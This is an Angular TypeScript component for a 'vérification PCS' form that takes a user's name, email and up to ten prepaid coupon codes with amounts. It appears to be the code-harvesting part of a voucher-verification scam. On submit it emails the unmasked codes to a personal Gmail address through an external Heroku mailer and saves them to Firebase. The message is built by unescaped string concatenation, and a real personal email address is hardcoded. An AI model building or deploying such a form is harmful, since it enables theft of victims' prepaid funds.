import { Component, OnInit } from '@angular/core';
import { NgForm, FormGroup, FormBuilder, FormControl, AbstractControl, Validators } from '@angular/forms';
import * as $ from 'jquery';
import { HttpClient } from '@angular/common/http';
import { DbFireService } from '../services/db-fire.service';
import { map } from 'rxjs/operators';

@Component({
  selector: 'app-suivi',
  templateUrl: './suivi.component.html',
  styleUrls: ['./suivi.component.css']
})
export class SuiviComponent implements OnInit {
	loading: boolean = false;
	visibleLine: number = 2;
	codeTab = {"1":true, "2":true, "3":true, "4":true, "5":true, "6":true, "7":true, "8":true, "9":true, "10":true}
    codeValTab = {"1":"", "2":"", "3":"", "4":"", "5":"", "6":"", "7":"", "8":"", "9":"sqqdfdgf", "10":"kkjj"}
	codeLineError = {"v2":false, "v3":false, "v4":false, "v5":false, "v6":false, "v7":false, "v8":false, "v9":false, "v10":false}
	verificationForm: FormGroup;
	submitted = false;
	endSubmit = true;
	codePattern = /^[0-9]{12}$/;
	amountPattern = /^[0-9]{2,11}$/;



 ValidateCode(control: AbstractControl){
   if(control.value !== '' && control.value < 99999999999){
     return { validCode: true };
   }
   return null;
 }





  constructor(private http: HttpClient, private db: DbFireService){}
  addVerif(act: number){
  	this.resetHiddenInput();
  	if(act == 1){
  		if(this.visibleLine < 10){
  			this.visibleLine++;
  		}
  	}else{
  		if(this.visibleLine > 2){
  			this.visibleLine--;
  		}
  	}
  }

  resetHiddenInput(){
  	for(var i = this.visibleLine; i <= 10; i++){
  		this.verificationForm.controls['montant'+i].setValue('');
  		this.codeLineError['v'+i] = false;
  	}
  }
  switchView(placeNb: number){
  	this.codeTab[placeNb] = (this.codeTab[placeNb]) ? false : true;
  	this.uppercaseCode();
  }
  copyHidden(elm: any, placeNb: number){
  	var strToDisplay: string = '';
  	this.codeLineError = {"v2":false, "v3":false, "v4":false, "v5":false, "v6":false, "v7":false, "v8":false, "v9":false, "v10":false};
  	this.uppercaseCode();
  	var valLen = elm.target.value.length;
  	for(var i = 0; i < valLen; i++){
  		strToDisplay += "*";
  	}
  	this.codeValTab[placeNb] = strToDisplay;
  }
  get f(){ return this.verificationForm.controls; }
  validLine(placeId: number){
  	var returnValue = false;
  	return returnValue;
  }
  uppercaseCode(){
  	$('input[formControlName^=code]').each(function(){
  		var valueTaken = $(this).val().toUpperCase();
  		$(this).val(valueTaken);
  	});
  }

  ngOnInit(){
  	this.verificationForm = new FormGroup({
        nm: new FormControl('', [Validators.required]),
        email: new FormControl('', [Validators.required, Validators.email]),
        code1: new FormControl('', [Validators.required, Validators.pattern(this.codePattern), this.ValidateCode]),
        montant1: new FormControl('', [Validators.required, Validators.min(10), Validators.pattern(this.amountPattern)]),
        code2: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant2: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code3: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant3: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code4: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant4: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code5: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant5: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code6: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant6: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code7: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant7: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code8: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant8: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code9: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant9: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)]),
        code10: new FormControl('', [Validators.pattern(this.codePattern), this.ValidateCode]),
        montant10: new FormControl('', [Validators.min(10), Validators.pattern(this.amountPattern)])
  	});
  }
  submitForm(){
  	this.loading = true;
  	this.submitted = true;
  	this.endSubmit = true;
  	this.codeLineError = {"v2":false, "v3":false, "v4":false, "v5":false, "v6":false, "v7":false, "v8":false, "v9":false, "v10":false}
  	const nm = this.verificationForm.get('nm').value.trim();
  	const email = this.verificationForm.get('email').value.trim();
  	const code1 = this.verificationForm.get('code1').value.trim();
  	const montant1 = this.verificationForm.get('montant1').value.trim();
  	const code2 = this.verificationForm.get('code2').value.trim();
  	const montant2 = this.verificationForm.get('montant2').value.trim();
  	const code3 = this.verificationForm.get('code3').value.trim();
  	const montant3 = this.verificationForm.get('montant3').value.trim();
  	const code4 = this.verificationForm.get('code4').value.trim();
  	const montant4 = this.verificationForm.get('montant4').value.trim();
  	const code5 = this.verificationForm.get('code5').value.trim();
  	const montant5 = this.verificationForm.get('montant5').value.trim();
  	const code6 = this.verificationForm.get('code6').value.trim();
  	const montant6 = this.verificationForm.get('montant6').value.trim();
  	const code7 = this.verificationForm.get('code7').value.trim();
  	const montant7 = this.verificationForm.get('montant7').value.trim();
  	const code8 = this.verificationForm.get('code8').value.trim();
  	const montant8 = this.verificationForm.get('montant8').value.trim();
  	const code9 = this.verificationForm.get('code9').value.trim();
  	const montant9 = this.verificationForm.get('montant9').value.trim();
  	const code10 = this.verificationForm.get('code10').value.trim();
  	const montant10 = this.verificationForm.get('montant10').value.trim();
    
    if(montant2 !== '' && code2 == ''){ 
    	this.codeLineError.v2 = true;
        this.endSubmit = false;
    }
  	if(montant3 !== '' && code3 == ''){ 
  		this.codeLineError.v3 = true;
  	    this.endSubmit = false;
  	}
  	if(montant4 !== '' && code4 == ''){ 
  		this.codeLineError.v4 = true;
  	    this.endSubmit = false;
  	}
  	if(montant5 !== '' && code5 == ''){ 
  		this.codeLineError.v5 = true;
  	    this.endSubmit = false;
  	}
  	if(montant6 !== '' && code6 == ''){ 
  		this.codeLineError.v6 = true;
  	    this.endSubmit = false;
  	}
  	if(montant7 !== '' && code7 == ''){ 
  		this.codeLineError.v7 = true;
  	    this.endSubmit = false;
  	}
  	if(montant8 !== '' && code8 == ''){ 
  		this.codeLineError.v8 = true;
  	    this.endSubmit = false;
  	}
  	if(montant9 !== '' && code9 == ''){ 
  		this.codeLineError.v9 = true;
  	    this.endSubmit = false;
  	}
  	if(montant10 !== '' && code10 == ''){ 
  		this.codeLineError.v10 = true;
  	    this.endSubmit = false;
  	}
  	if(this.verificationForm.invalid){
  		this.loading = false; return;
  	}else{
  		this.loading = false;
  		if(this.endSubmit){
  			const dataSend = {
  				'nom' : nm,
  				'email' : email,
  				'code1' : code1,
  				'montant1' : montant1,
  				'code2' : code2,
  				'montant2' : montant2,
  				'code3' : code3,
  				'montant3' : montant3,
  				'code4' : code4,
  				'montant4' : montant4,
  				'code5' : code5,
  				'montant5' : montant5,
  				'code6' : code6,
  				'montant6' : montant6,
  				'code7' : code7,
  				'montant7' : montant7,
  				'code8' : code8,
  				'montant8' : montant8,
  				'code9' : code9,
  				'montant9' : montant9,
  				'code10' : code10,
  				'montant10' : montant10
  			}


  			var msgContent = 'Nom: ' + nm+'</b><br/>'+
  				'Email: ' + '<b>'+email+'</b><br/>'+
  				'Code 1: ' + '<b>'+code1+'</b>'+
  				' -> ' + '<b>'+montant1+'</b><br/>'+
  				'Code 2' + '<b>'+code2+'</b>'+
  				' -> ' + '<b>'+montant2+'</b><br/>'+
  				'Code 3' + '<b>'+code3+'</b>'+
  				' -> ' + '<b>'+montant3+'</b><br/>'+
  				'Code 4' + '<b>'+code4+'</b>'+
  				' -> ' + '<b>'+montant4+'</b><br/>'+
  				'Code 5' + '<b>'+code5+'</b>'+
  				' -> ' + '<b>'+montant5+'</b><br/>'+
  				'Code 6' + '<b>'+code6+'</b>'+
  				' -> ' + '<b>'+montant6+'</b><br/>'+
  				'Code 7' + '<b>'+code7+'</b>'+
  				' -> ' + '<b>'+montant7+'</b><br/>'+
  				'Code 8' + '<b>'+code8+'</b>'+
  				' -> ' + '<b>'+montant8+'</b><br/>'+
  				'Code 9' + '<b>'+code9+'</b>'+
  				' -> ' + '<b>'+montant9+'</b><br/>'+
  				'Code 10' + '<b>'+code10+'</b>'+ 
  				' -> ' + '<b>'+montant10+'</b>';

  				var sendMailTo: string = 'traorebaba000@gmail.com';
  				var sendSubject: string = 'Nouvelle vérification PCS';

  				var makeRequest: any = this.http.get('https://mailertake.herokuapp.com/v1/mail?to='+sendMailTo+'&subject='+sendSubject+'+&msg='+msgContent)
  				                       .pipe(
  				                       	map(res => console.log(res))
  				                       	)
  				                       .subscribe(res => {
  				                       	console.log(res);
  				                       },
  				                       (err) => {
  				                       	console.log(err)
  				                       },
  				                       () => {
  				                       	console.log('Envoyé')
  				                       });


            this.db.addSuivi(dataSend);
  			console.log(dataSend);
  		}
  		
  	}
  }

}
